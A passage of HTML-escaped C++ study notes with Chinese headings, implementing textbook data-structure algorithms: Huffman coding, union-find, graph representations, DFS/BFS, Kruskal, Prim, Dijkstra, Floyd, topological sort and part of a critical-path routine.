&#x2F;&#x2F; 获取两个最小节点 int s1 &#x3D; -1, s2 &#x3D; -1; &#x2F;&#x2F; 寻找第一个有效节点 while (!pq.empty() &amp;&amp; s1 &#x3D;&#x3D; -1) &#123; auto top &#x3D; pq.top(); pq.pop(); if (T[top.second].parent &#x3D;&#x3D; 0) &#123; s1 &#x3D; top.second; &#125; &#125; &#x2F;&#x2F; 寻找第二个有效节点 while (!pq.empty() &amp;&amp; s2 &#x3D;&#x3D; -1) &#123; auto top &#x3D; pq.top(); pq.pop(); if (T[top.second].parent &#x3D;&#x3D; 0) &#123; s2 &#x3D; top.second; &#125; &#125; if (s1 &#x3D;&#x3D; -1 || s2 &#x3D;&#x3D; -1) &#123; return; &#125; &#x2F;&#x2F; 创建新节点 T[current].weight &#x3D; T[s1].weight + T[s2].weight; T[current].lchild &#x3D; s1; T[current].rchild &#x3D; s2; T[s1].parent &#x3D; current; T[s2].parent &#x3D; current; &#x2F;&#x2F; 将新节点加入优先队列 pq.push(make_pair(T[current].weight, current)); current++; &#125; &#125; void CreateHuffmanCode(HuffmanTree HT, HuffmanCode &amp;HC, int n) &#123; HC &#x3D; new char *[n + 1]; char *cd &#x3D; new char[n]; cd[n - 1] &#x3D; &#39;\\0&#39;; for (int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; int start &#x3D; n - 1; int c &#x3D; i; int f &#x3D; HT[i].parent; while (f !&#x3D; 0) &#123; start--; if (HT[f].lchild &#x3D;&#x3D; c) &#123; cd[start] &#x3D; &#39;0&#39;; &#125; else &#123; cd[start] &#x3D; &#39;1&#39;; &#125; c &#x3D; f; f &#x3D; HT[f].parent; &#125; HC[i] &#x3D; new char[n - start]; strcpy(HC[i], &amp;cd[start]); &#125; delete[] cd; &#125; 并查集 const int MAXN &#x3D; 1000; int father[MAXN]; int Rank[MAXN]; void init() &#123; for (int i &#x3D; 0; i &lt; MAXN; i++) &#123; father[i] &#x3D; i; Rank[i] &#x3D; 1; &#125; &#125; int find_set(int x) &#123; if (x !&#x3D; father[x]) &#123; father[x] &#x3D; find_set(father[x]); &#125; return father[x]; &#125; void Union(int x, int y) &#123; int root_x &#x3D; find_set(x); int root_y &#x3D; find_set(y); if (root_x &#x3D;&#x3D; root_y) return; if (Rank[root_x] &gt; Rank[root_y]) &#123; father[root_y] &#x3D; root_x; Rank[root_x] +&#x3D; Rank[root_y]; &#125; else &#123; father[root_x] &#x3D; root_y; Rank[root_y] +&#x3D; Rank[root_x]; &#125; &#125; 图 邻接矩阵 #include &lt;bits&#x2F;stdc++.h&gt; using namespace std; #define MaxInt 32767 &#x2F;&#x2F; 极大值 #define MVNum 100 &#x2F;&#x2F; 顶点最大值 typedef char VerTexType; &#x2F;&#x2F; 顶点类型定义 typedef int ArcType; &#x2F;&#x2F; 边类型定义 &#x2F;&#x2F; 邻接矩阵表示法 typedef struct &#123; VerTexType vexs[MVNum]; &#x2F;&#x2F; 顶点表 ArcType arcs[MVNum][MVNum]; &#x2F;&#x2F; 邻接矩阵 int vexnum, arcnum; &#x2F;&#x2F; 顶点数目 边数目 &#125; AMGraph; &#x2F;&#x2F; 为AMGraph定位顶点 int LocateVex(AMGraph G, VerTexType v) &#123; for (int i &#x3D; 0; i &lt; G.vexnum; i++) &#123; if (G.vexs[i] &#x3D;&#x3D; v) &#123; return i; &#125; &#125; return -1; &#125; &#x2F;&#x2F; 初始化邻接矩阵 void CreateAM(AMGraph &amp;G) &#123; cin &gt;&gt; G.vexnum &gt;&gt; G.arcnum; for (int i &#x3D; 0; i &lt; G.vexnum; i++) &#123; cin &gt;&gt; G.vexs[i]; &#125; for (int i &#x3D; 0; i &lt; G.vexnum; i++) &#123; for (int j &#x3D; 0; j &lt; G.vexnum; j++) &#123; if (i &#x3D;&#x3D; j) &#123; G.arcs[i][j] &#x3D; 0; &#125; else &#123; G.arcs[i][j] &#x3D; MaxInt; &#125; &#125; &#125; for (int k &#x3D; 0; k &lt; G.arcnum; k++) &#123; VerTexType v1, v2; ArcType w; cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w; int i &#x3D; LocateVex(G, v1); int j &#x3D; LocateVex(G, v2); G.arcs[i][j] &#x3D; w; G.arcs[j][i] &#x3D; w; &#125; &#125; 邻接表 #include&lt;bits&#x2F;stdc++.h&gt; using namespace std; &#x2F;&#x2F; 邻接表表示法 typedef struct ArcNode &#123; int adjvex; &#x2F;&#x2F; 该边指向的顶点位置 int weight; &#x2F;&#x2F; 边的权重 struct ArcNode *nextarc; &#125; ArcNode; typedef struct VNode &#123; VerTexType data; &#x2F;&#x2F; 顶点信息 ArcNode *firstarc; &#x2F;&#x2F; 指向第一条边的指针 &#125; VNode, AdjList[MVNum]; typedef struct &#123; AdjList vertices; &#x2F;&#x2F; 邻接表 int vexnum, arcnum; &#x2F;&#x2F; 顶点数和边数 &#125; ALGraph; &#x2F;&#x2F; 为 ALGraph 定位顶点 int LocateVex(const ALGraph &amp;G, VerTexType v) &#123; for (int i &#x3D; 0; i &lt; G.vexnum; i++) &#123; if (G.vertices[i].data &#x3D;&#x3D; v) &#123; return i; &#125; &#125; return -1; &#125; &#x2F;&#x2F; 初始化邻接表 void CreateAL(ALGraph &amp;G) &#123; cin &gt;&gt; G.vexnum &gt;&gt; G.arcnum; for (int i &#x3D; 0; i &lt; G.vexnum; i++) &#123; cin &gt;&gt; G.vertices[i].data; G.vertices[i].firstarc &#x3D; NULL; &#125; for (int k &#x3D; 0; k &lt; G.arcnum; k++) &#123; VerTexType v1, v2; ArcType weight; cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; weight; int i &#x3D; LocateVex(G, v1); int j &#x3D; LocateVex(G, v2); &#x2F;&#x2F; 添加边 v1 -&gt; v2 头插法 ArcNode *p1 &#x3D; new ArcNode; p1-&gt;adjvex &#x3D; j; p1-&gt;weight &#x3D; weight; p1-&gt;nextarc &#x3D; G.vertices[i].firstarc; G.vertices[i].firstarc &#x3D; p1; &#x2F;* 添加边 v2 -&gt; v1（无向图必须对称） ArcNode *p2 &#x3D; new ArcNode; p2-&gt;adjvex &#x3D; i; p2-&gt;weight &#x3D; weight; p2-&gt;nextarc &#x3D; G.vertices[j].firstarc; G.vertices[j].firstarc &#x3D; p2; *&#x2F; &#125; &#125; 十字链表 &#x2F;&#x2F; 十字链表表示法（有向图） typedef struct ArcNode_OL &#123; int tailvex; &#x2F;&#x2F; 弧尾顶点位置 int headvex; &#x2F;&#x2F; 弧头顶点位置 struct ArcNode_OL *hlink; &#x2F;&#x2F; 指向同一弧头的下一条弧 struct ArcNode_OL *tlink; &#x2F;&#x2F; 指向同一弧尾的下一条弧 int weight; &#x2F;&#x2F; 弧的权值 InfoType info; &#x2F;&#x2F; 其他信息 &#125; ArcNode_OL; typedef struct VexNode_OL &#123; VerTexType data; &#x2F;&#x2F; 顶点数据 ArcNode_OL *firstin; &#x2F;&#x2F; 指向以该顶点为弧头的第一条弧 ArcNode_OL *firstout; &#x2F;&#x2F; 指向以该顶点为弧尾的第一条弧 &#125; VexNode_OL; typedef struct &#123; VexNode_OL xlist[MVNum]; &#x2F;&#x2F; 顶点表 int vexnum, arcnum; &#x2F;&#x2F; 顶点数和弧数 &#125; OLGraph; 邻接多重表 &#x2F;&#x2F; 邻接多重表表示法（无向图） typedef struct EBox &#123; int ivex, jvex; &#x2F;&#x2F; 该边依附的两个顶点位置 struct EBox *ilink; &#x2F;&#x2F; 指向依附于顶点ivex的下一条边 struct EBox *jlink; &#x2F;&#x2F; 指向依附于顶点jvex的下一条边 int weight; &#x2F;&#x2F; 边的权值 bool mark; &#x2F;&#x2F; 访问标记 InfoType info; &#x2F;&#x2F; 其他信息 &#125; EBox; typedef struct VexBox &#123; VerTexType data; &#x2F;&#x2F; 顶点数据 EBox *firstedge; &#x2F;&#x2F; 指向第一条依附于该顶点的边 &#125; VexBox; typedef struct &#123; VexBox adjmulist[MVNum]; &#x2F;&#x2F; 顶点表 int vexnum, edgenum; &#x2F;&#x2F; 顶点数和边数 &#125; AMLGraph; DFS #include &lt;iostream&gt; #include &lt;vector&gt; using namespace std; const int MVNum &#x3D; 100; bool visited[MVNum]; vector&lt;int&gt; path; struct AMGraph &#123; int arcs[MVNum][MVNum]; int vexnum, arcnum; &#125;; struct ArcNode &#123; int adjvex; ArcNode *nextarc; &#125;; struct VNode &#123; ArcNode *firstarc; &#125;; struct ALGraph &#123; VNode vertices[MVNum]; int vexnum, arcnum; &#125;; void DFS_AM(AMGraph G, int v) &#123; cout &lt;&lt; v &lt;&lt; &quot; &quot;; visited[v] &#x3D; true; path.push_back(v); for (int w &#x3D; 0; w &lt; G.vexnum; w++) if (G.arcs[v][w] &amp;&amp; !visited[w]) DFS_AM(G, w); &#125; void DFS_AL(ALGraph G, int v) &#123; cout &lt;&lt; v &lt;&lt; &quot; &quot;; visited[v] &#x3D; true; path.push_back(v); ArcNode *p &#x3D; G.vertices[v].firstarc; while (p) &#123; int w &#x3D; p-&gt;adjvex; if (!visited[w]) DFS_AL(G, w); p &#x3D; p-&gt;nextarc; &#125; &#125; void DFSTraverse_AM(AMGraph G) &#123; path.clear(); for (int i &#x3D; 0; i &lt; G.vexnum; ++i) visited[i] &#x3D; false; for (int i &#x3D; 0; i &lt; G.vexnum; ++i) if (!visited[i]) DFS_AM(G, i); &#125; void DFSTraverse_AL(ALGraph G) &#123; path.clear(); for (int i &#x3D; 0; i &lt; G.vexnum; ++i) visited[i] &#x3D; false; for (int i &#x3D; 0; i &lt; G.vexnum; ++i) if (!visited[i]) DFS_AL(G, i); &#125; void PrintPath() &#123; for (size_t i &#x3D; 0; i &lt; path.size(); ++i) &#123; cout &lt;&lt; path[i]; if (i &lt; path.size() - 1) cout &lt;&lt; &quot; -&gt; &quot;; &#125; cout &lt;&lt; endl; &#125; BFS #include &lt;iostream&gt; #include &lt;vector&gt; #include &lt;queue&gt; using namespace std; const int MVNum &#x3D; 100; bool visited[MVNum]; vector&lt;int&gt; path; struct AMGraph &#123; int arcs[MVNum][MVNum]; int vexnum, arcnum; &#125;; struct ArcNode &#123; int adjvex; ArcNode *nextarc; &#125;; struct VNode &#123; ArcNode *firstarc; &#125;; struct ALGraph &#123; VNode vertices[MVNum]; int vexnum, arcnum; &#125;; void BFS_AM(AMGraph G, int v) &#123; queue&lt;int&gt; Q; cout &lt;&lt; v &lt;&lt; &quot; &quot;; visited[v] &#x3D; true; path.push_back(v); Q.push(v); while (!Q.empty()) &#123; int u &#x3D; Q.front(); Q.pop(); for (int w &#x3D; 0; w &lt; G.vexnum; w++) &#123; if (G.arcs[u][w] &amp;&amp; !visited[w]) &#123; cout &lt;&lt; w &lt;&lt; &quot; &quot;; visited[w] &#x3D; true; path.push_back(w); Q.push(w); &#125; &#125; &#125; &#125; void BFS_AL(ALGraph G, int v) &#123; queue&lt;int&gt; Q; cout &lt;&lt; v &lt;&lt; &quot; &quot;; visited[v] &#x3D; true; path.push_back(v); Q.push(v); while (!Q.empty()) &#123; int u &#x3D; Q.front(); Q.pop(); ArcNode *p &#x3D; G.vertices[u].firstarc; while (p) &#123; int w &#x3D; p-&gt;adjvex; if (!visited[w]) &#123; cout &lt;&lt; w &lt;&lt; &quot; &quot;; visited[w] &#x3D; true; path.push_back(w); Q.push(w); &#125; p &#x3D; p-&gt;nextarc; &#125; &#125; &#125; void BFSTraverse_AM(AMGraph G) &#123; path.clear(); for (int i &#x3D; 0; i &lt; G.vexnum; ++i) visited[i] &#x3D; false; for (int i &#x3D; 0; i &lt; G.vexnum; ++i) if (!visited[i]) BFS_AM(G, i); &#125; void BFSTraverse_AL(ALGraph G) &#123; path.clear(); for (int i &#x3D; 0; i &lt; G.vexnum; ++i) visited[i] &#x3D; false; for (int i &#x3D; 0; i &lt; G.vexnum; ++i) if (!visited[i]) BFS_AL(G, i); &#125; void PrintPath() &#123; for (size_t i &#x3D; 0; i &lt; path.size(); ++i) &#123; cout &lt;&lt; path[i]; if (i &lt; path.size() - 1) cout &lt;&lt; &quot; -&gt; &quot;; &#125; cout &lt;&lt; endl; &#125; 最小生成树（MST） Kruskal #include&lt;bits&#x2F;stdc++.h&gt; using namespace std; #define MAXVEX 100 #define INF 114514 typedef struct &#123; int adjvex; int weight; struct ArcNode *next; &#125; ArcNode; typedef struct &#123; ArcNode *firstarc; &#125; AdjList[MAXVEX]; typedef struct &#123; AdjList vertices; int vexnum, arcnum; &#125; Graph; bool hasCycle(Graph &amp;G, int from, int to, vector&lt;bool&gt;&amp; visited, int parent) &#123; visited[from] &#x3D; true; ArcNode* p &#x3D; G.vertices[from].firstarc; while(p) &#123; int next &#x3D; p-&gt;adjvex; if(!visited[next]) &#123; if(hasCycle(G, next, to, visited, from)) &#123; return true; &#125; &#125; else if( next !&#x3D; parent &amp;&amp; next &#x3D;&#x3D; to) &#123; return true; &#125; p &#x3D; p-&gt;next; &#125; return false; &#125; bool isSafe(Graph &amp;G, int from, int to) &#123; vector&lt;bool&gt; visited(G.vexnum + 1, false); return !hasCycle(G, from, to, visited, -1); &#125; void CreateGraph(Graph &amp;G) &#123; cin &gt;&gt; G.vexnum &gt;&gt; G.arcnum; for(int i&#x3D;1; i&lt;&#x3D;G.vexnum; i++) &#123; G.vertices[i].firstarc &#x3D; nullptr; &#125; for(int i&#x3D;1; i&lt;&#x3D;G.arcnum; i++) &#123; int m,n,w; cin &gt;&gt; m &gt;&gt; n &gt;&gt; w; ArcNode *p1 &#x3D; new ArcNode; p1-&gt;adjvex &#x3D; n; p1-&gt;weight &#x3D; w; p1-&gt;next &#x3D; G.vertices[m].firstarc; G.vertices[m].firstarc &#x3D; p1; ArcNode *p2 &#x3D; new ArcNode; p2-&gt;adjvex &#x3D; m; p2-&gt;weight &#x3D; w; p2-&gt;next &#x3D; G.vertices[n].firstarc; G.vertices[n].firstarc &#x3D; p2; &#125; &#125; void PrintMST(vector&lt;vector&lt;int&gt;&gt; &amp;mst, int n) &#123; for(int i&#x3D;1; i&lt;&#x3D;n; i++) &#123; for(int j&#x3D;i+1; j&lt;&#x3D;n; j++) &#123; if(mst[i][j] !&#x3D; 0) &#123; cout &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; j &lt;&lt; endl; &#125; &#125; &#125; &#125; int main() &#123; Graph G; CreateGraph(G); vector&lt;vector&lt;int&gt;&gt; mst(G.vexnum+1, vector&lt;int&gt;(G.vexnum+1, 0)); int MSTedge &#x3D; 0; while(MSTedge &lt; G.vexnum-1) &#123; int min &#x3D; INF; int p1 &#x3D; -1, p2 &#x3D; -1; for(int i&#x3D;1; i&lt;&#x3D;G.vexnum; i++) &#123; ArcNode *p &#x3D; G.vertices[i].firstarc; while(p) &#123; if(p-&gt;weight &lt; min &amp;&amp; !mst[i][p-&gt;adjvex] &amp;&amp; isSafe(G, i, p-&gt;adjvex)) &#123; min &#x3D; p-&gt;weight; p1 &#x3D; i; p2 &#x3D; p-&gt;adjvex; &#125; p &#x3D; p-&gt;next; &#125; &#125; if(p1 &#x3D;&#x3D; -1) &#123; cout &lt;&lt; &quot;Invalid.&quot; &lt;&lt; endl; return 1; &#125; mst[p1][p2] &#x3D; 1; mst[p2][p1] &#x3D; 1; MSTedge++; &#125; PrintMST(mst, G.vexnum); return 0; &#125; Prim #include&lt;bits&#x2F;stdc++.h&gt; using namespace std; #define INF 32366 #define MAX_VERTICES 100 typedef struct &#123; int edges[MAX_VERTICES][MAX_VERTICES]; int edgeCount; int vertexCount; &#125; Graph; void printMST(vector&lt;vector&lt;int&gt;&gt;&amp; mst, int n) &#123; for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; for(int j &#x3D; i + 1; j &lt;&#x3D; n; j++) &#123; if(mst[i][j] &#x3D;&#x3D; 1) &#123; cout &lt;&lt; i &lt;&lt; &quot; - &quot; &lt;&lt; j &lt;&lt; endl; &#125; &#125; &#125; &#125; int main() &#123; int n; cin &gt;&gt; n; Graph g; g.edgeCount &#x3D; n - 1; g.vertexCount &#x3D; n; for (int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123; g.edges[i][j] &#x3D; INF; &#125; &#125; for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; int from, to, weight; cin &gt;&gt; from &gt;&gt; to &gt;&gt; weight; g.edges[from][to] &#x3D; weight; g.edges[to][from] &#x3D; weight; &#125; vector&lt;bool&gt; visited(n + 1, false); vector&lt;vector&lt;int&gt;&gt; mst(n + 1, vector&lt;int&gt;(n + 1, 0)); visited[1] &#x3D; true; int mstEdgeCount &#x3D; 0; while(mstEdgeCount &lt; n - 1) &#123; int minWeight &#x3D; INF; int minFrom &#x3D; -1; int minTo &#x3D; -1; for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; if(visited[i]) &#123; for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123; if(!visited[j] &amp;&amp; g.edges[i][j] &lt; minWeight) &#123; minWeight &#x3D; g.edges[i][j]; minFrom &#x3D; i; minTo &#x3D; j; &#125; &#125; &#125; &#125; if(minFrom &#x3D;&#x3D; -1) &#123; cout &lt;&lt; &quot;Invalid.&quot; &lt;&lt; endl; return 1; &#125; mst[minFrom][minTo] &#x3D; 1; mst[minTo][minFrom] &#x3D; 1; visited[minTo] &#x3D; true; mstEdgeCount++; &#125; printMST(mst, n); return 0; &#125; 最短路径 Dijkstra #include &lt;bits&#x2F;stdc++.h&gt; using namespace std; #define MVNum 100 #define INF 114154 typedef struct &#123; char vexs[MVNum]; int arcs[MVNum][MVNum]; int vexNum, arcNum; &#125; Graph; int LocateVex(const Graph &amp;G, char v) &#123; for (int i &#x3D; 0; i &lt; G.vexNum; ++i) &#123; if (G.vexs[i] &#x3D;&#x3D; v) return i; &#125; return -1; &#125; void Create(Graph &amp;G) &#123; cin &gt;&gt; G.vexNum &gt;&gt; G.arcNum; for (int i &#x3D; 1; i &lt;&#x3D; G.vexNum; i++) &#123; cin &gt;&gt; G.vexs[i]; &#125; for (int i &#x3D; 1; i &lt;&#x3D; G.vexNum; i++) &#123; for(int j&#x3D;1;j&lt;&#x3D;G.vexNum;j++) &#123; G.arcs[i][j]&#x3D;INF; if(i&#x3D;&#x3D;j) &#123; G.arcs[i][j]&#x3D;0; &#125; &#125; &#125; for (int k &#x3D; 1; k &lt;&#x3D; G.arcNum; k++) &#123; char v1, v2; int w; cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w; int i &#x3D; LocateVex(G, v1); int j &#x3D; LocateVex(G, v2); if (i !&#x3D; -1 &amp;&amp; j !&#x3D; -1) &#123; G.arcs[i][j] &#x3D; w; &#125; &#125; &#125; void Dijkstra(Graph &amp;G, char start)&#123; int v0 &#x3D; LocateVex(G,start); int n &#x3D; G.vexNum; vector&lt;int&gt; dist(n + 1, INF); vector&lt;bool&gt; visited(n + 1, false); vector&lt;int&gt; path(n + 1, -1); dist[v0] &#x3D; 0; for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; int u &#x3D; -1; int minDist &#x3D; INF; for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123; if(!visited[j] &amp;&amp; dist[j] &lt; minDist) &#123; u &#x3D; j; minDist &#x3D; dist[j]; &#125; &#125; if(u &#x3D;&#x3D; -1) break; visited[u] &#x3D; true; for(int v &#x3D; 1; v &lt;&#x3D; n; v++) &#123; if(!visited[v] &amp;&amp; G.arcs[u][v] !&#x3D; INF) &#123; if(dist[u] + G.arcs[u][v] &lt; dist[v]) &#123; dist[v] &#x3D; dist[u] + G.arcs[u][v]; path[v] &#x3D; u; &#x2F;&#x2F; 记录路径 &#125; &#125; &#125; &#125; for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; if(i !&#x3D; v0) &#123; if(dist[i] &#x3D;&#x3D; INF) &#123; cout &lt;&lt; &quot;Invalid.&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; dist[i] &lt;&lt; endl; cout &lt;&lt; start; vector&lt;int&gt; route; int k &#x3D; i; while(k !&#x3D; -1) &#123; route.push_back(k); k &#x3D; path[k]; &#125; for(int r &#x3D; route.size()-1; r &gt;&#x3D; 0; r--) &#123; cout &lt;&lt; &quot; -&gt; &quot; &lt;&lt; G.vexs[route[r]]; &#125; cout &lt;&lt; endl; &#125; &#125; &#125; &#125; int main() &#123; Graph G; Create(G); char start; cin &gt;&gt; start; Dijkstra(G, start); return 0; &#125; Floyd #include &lt;bits&#x2F;stdc++.h&gt; using namespace std; #define MVNum 100 #define INF 114154 typedef struct &#123; char vexs[MVNum]; int arcs[MVNum][MVNum]; int vexNum, arcNum; &#125; Graph; int LocateVex(const Graph &amp;G, char v) &#123; for (int i &#x3D; 0; i &lt; G.vexNum; ++i) &#123; if (G.vexs[i] &#x3D;&#x3D; v) return i; &#125; return -1; &#125; void Create(Graph &amp;G) &#123; cin &gt;&gt; G.vexNum &gt;&gt; G.arcNum; for (int i &#x3D; 1; i &lt;&#x3D; G.vexNum; i++) &#123; cin &gt;&gt; G.vexs[i]; &#125; for (int i &#x3D; 1; i &lt;&#x3D; G.vexNum; i++) &#123; for(int j&#x3D;1;j&lt;&#x3D;G.vexNum;j++) &#123; G.arcs[i][j]&#x3D;INF; if(i&#x3D;&#x3D;j) &#123; G.arcs[i][j]&#x3D;0; &#125; &#125; &#125; for (int k &#x3D; 1; k &lt;&#x3D; G.arcNum; k++) &#123; char v1, v2; int w; cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w; int i &#x3D; LocateVex(G, v1); int j &#x3D; LocateVex(G, v2); if (i !&#x3D; -1 &amp;&amp; j !&#x3D; -1) &#123; G.arcs[i][j] &#x3D; w; &#125; &#125; &#125; void Floyd(Graph &amp;G) &#123; int n &#x3D; G.vexNum; vector&lt;vector&lt;int&gt;&gt; dist(n + 1, vector&lt;int&gt;(n + 1)); vector&lt;vector&lt;int&gt;&gt; path(n + 1, vector&lt;int&gt;(n + 1, -1)); for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123; dist[i][j] &#x3D; G.arcs[i][j]; if(dist[i][j] &lt; INF &amp;&amp; i !&#x3D; j) &#123; path[i][j] &#x3D; i; &#125; &#125; &#125; for(int k &#x3D; 1; k &lt;&#x3D; n; k++) &#123; for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123; if(dist[i][k] !&#x3D; INF &amp;&amp; dist[k][j] !&#x3D; INF &amp;&amp; dist[i][k] + dist[k][j] &lt; dist[i][j]) &#123; dist[i][j] &#x3D; dist[i][k] + dist[k][j]; path[i][j] &#x3D; path[k][j]; &#125; &#125; &#125; &#125; for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123; if(i !&#x3D; j) &#123; cout &lt;&lt; G.vexs[i] &lt;&lt; &quot; &quot; &lt;&lt; G.vexs[j]; if(dist[i][j] &#x3D;&#x3D; INF) &#123; cout &lt;&lt; &quot;Invalid.&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; dist[i][j] &lt;&lt; endl; cout &lt;&lt; G.vexs[i]; int k &#x3D; path[i][j]; vector&lt;int&gt; route; while(k !&#x3D; -1) &#123; route.push_back(k); k &#x3D; path[i][k]; &#125; for(int r &#x3D; route.size()-1; r &gt;&#x3D; 0; r--) &#123; cout &lt;&lt; &quot; -&gt; &quot; &lt;&lt; G.vexs[route[r]]; &#125; cout &lt;&lt; &quot; -&gt; &quot; &lt;&lt; G.vexs[j] &lt;&lt; endl; &#125; &#125; &#125; &#125; &#125; int main() &#123; Graph G; Create(G); Floyd(G); return 0; &#125; 拓扑排序 #include &lt;bits&#x2F;stdc++.h&gt; using namespace std; #define MVNum 100 typedef struct &#123; char vexs[MVNum]; int arcs[MVNum][MVNum]; int vexNum, arcNum; &#125; Graph; int LocateVex(const Graph &amp;G, char v) &#123; for (int i &#x3D; 0; i &lt; G.vexNum; ++i) &#123; if (G.vexs[i] &#x3D;&#x3D; v) return i; &#125; return -1; &#125; void CreateGraph(Graph &amp;G) &#123; cin &gt;&gt; G.vexNum &gt;&gt; G.arcNum; for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; cin &gt;&gt; G.vexs[i]; &#125; for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123; G.arcs[i][j] &#x3D; 0; &#125; &#125; for (int k &#x3D; 0; k &lt; G.arcNum; k++) &#123; char v1, v2; cin &gt;&gt; v1 &gt;&gt; v2; int i &#x3D; LocateVex(G, v1); int j &#x3D; LocateVex(G, v2); if (i !&#x3D; -1 &amp;&amp; j !&#x3D; -1) &#123; G.arcs[i][j] &#x3D; 1; &#x2F;&#x2F; 有向图 &#125; &#125; &#125; bool TopologicalSort(Graph &amp;G) &#123; vector&lt;int&gt; inDegree(G.vexNum, 0); for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123; if (G.arcs[j][i] &#x3D;&#x3D; 1) &#123; inDegree[i]++; &#125; &#125; &#125; queue&lt;int&gt; q; for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; if (inDegree[i] &#x3D;&#x3D; 0) &#123; q.push(i); &#125; &#125; int count &#x3D; 0; vector&lt;char&gt; result; while (!q.empty()) &#123; int v &#x3D; q.front(); q.pop(); result.push_back(G.vexs[v]); count++; for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; if (G.arcs[v][i] &#x3D;&#x3D; 1) &#123; inDegree[i]--; if (inDegree[i] &#x3D;&#x3D; 0) &#123; q.push(i); &#125; &#125; &#125; &#125; if (count &#x3D;&#x3D; G.vexNum) &#123; for (char c : result) &#123; cout &lt;&lt; c &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; return true; &#125; else &#123; return false; &#125; &#125; int main() &#123; Graph G; CreateGraph(G); TopologicalSort(G); return 0; &#125; 关键路径 #include &lt;bits&#x2F;stdc++.h&gt; using namespace std; #define MVNum 100 #define INF 114154 typedef struct &#123; char vexs[MVNum]; int arcs[MVNum][MVNum]; int vexNum, arcNum; &#125; Graph; int LocateVex(const Graph &amp;G, char v) &#123; for (int i &#x3D; 0; i &lt; G.vexNum; ++i) &#123; if (G.vexs[i] &#x3D;&#x3D; v) return i; &#125; return -1; &#125; void CreateGraph(Graph &amp;G) &#123; cin &gt;&gt; G.vexNum &gt;&gt; G.arcNum; for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; cin &gt;&gt; G.vexs[i]; &#125; for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123; G.arcs[i][j] &#x3D; 0; &#125; &#125; for (int k &#x3D; 0; k &lt; G.arcNum; k++) &#123; char v1, v2; int w; cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w; int i &#x3D; LocateVex(G, v1); int j &#x3D; LocateVex(G, v2); if (i !&#x3D; -1 &amp;&amp; j !&#x3D; -1) &#123; G.arcs[i][j] &#x3D; w; &#125; &#125; &#125; bool TopologicalSort(Graph &amp;G, vector&lt;int&gt; &amp;topoOrder) &#123; vector&lt;int&gt; inDegree(G.vexNum, 0); for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123; if (G.arcs[j][i] !&#x3D; 0) &#123; inDegree[i]++; &#125; &#125; &#125; queue&lt;int&gt; q; for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; if (inDegree[i] &#x3D;&#x3D; 0) &#123; q.push(i); &#125; &#125; while (!q.empty()) &#123; int v &#x3D; q.front(); q.pop(); topoOrder.push_back(v); for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; if (G.arcs[v][i] !&#x3D; 0) &#123; inDegree[i]--; if (inDegree[i] &#x3D;&#x3D; 0) &#123; q.push(i); &#125; &#125; &#125; &#125; return topoOrder.size() &#x3D;&#x3D; G.vexNum; &#125; void CalculateVE(Graph &amp;G, const vector&lt;int&gt; &amp;topoOrder, vector&lt;int&gt; &amp;ve) &#123; &#x2F;&#x2F; 初始化ve数组 ve.resize(G.vexNum, 0); &#x2F;&#x2F; 按拓扑顺序计算ve for (int i &#x3D; 0; i &lt; topoOrder.size(); i++) &#123; int u &#x3D; topoOrder[i]; for (int v &#x3D; 0; v &lt; G.vexNum; v++) &#123; if (G.arcs[u][v] !&#x3D; 0) &#123; ve[v] &#x3D; max(ve[v], ve[u] + G.arcs[u][v]); &#125; &#125; &#125; &#125; void CalculateVL(Graph &amp;G, const vector&lt;int&gt; &amp;topoOrder, const vector&lt;int&gt; &amp;ve, vector&lt;int&gt; &amp;vl) &#123; &#x2F;&#x2F; 初始化vl数组 vl.resize(G.vexNum, ve[topoOrder.back()]); &#x2F;&#x2F; 按逆拓扑顺序计算vl for (int i &#x3D; topoOrder.size() - 1; i &gt;&#x3D; 0; i--) &#123; int u &#x3D; topoOrder[i]; for (int v &#x3D; 0; v &lt; G.vexNum; v++) &#123; if (G.arcs[u][v] !&#x3D; 0) &#123; vl[u] &#x3D; min(vl[u], vl[v] - G.arcs[u][v]); &#125; &#125; &#125; &#125; void FindCriticalPath(Graph &amp;G, const vector&lt;int&gt; &amp;ve, const vector&lt;int&gt; &amp;vl) &#123; for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123; if (G.arcs[i][j] !&#x3D; 0) &#123; int e &#x3D; ve[i]; &#x2F;&#x2F; 活动最早开始时间 int l &#x3D; 